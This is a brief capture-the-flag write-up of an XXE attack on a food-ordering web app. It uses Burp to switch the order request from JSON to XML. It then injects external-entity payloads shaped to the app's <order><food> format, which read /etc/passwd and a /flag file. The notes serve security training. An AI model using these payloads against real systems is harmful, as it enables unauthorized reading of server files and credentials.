open the web 

xxe

use brup to intercept the order request

send the intercept into repeater

change the content type into xml

replace the existing json into this payload:
```
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY payload SYSTEM 'file:///etc/passwd'>]>
<root>&payload;</root>
```

-> Failed because need to choose the catagory first

open the orderContoller from the web source code to find what makes the web prompted to choose the category first

after seeing the order contoller file we found out that we need a specific xml format so that the back-end can read the xml payload

hence the payload become like this:
```
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY payload SYSTEM 'file:///etc/passwd'>]>
<order>
<food>&payload;</food>
</order>
```

!the input is not filtered at the orderContoller
passed directly

```
<?xlm version="1.0"?>
<!DOCTYPE root [<!ENTITY payload SYSTEM 'file:///flag'>]>
<order>
<food>&payload;</food>
</order>
```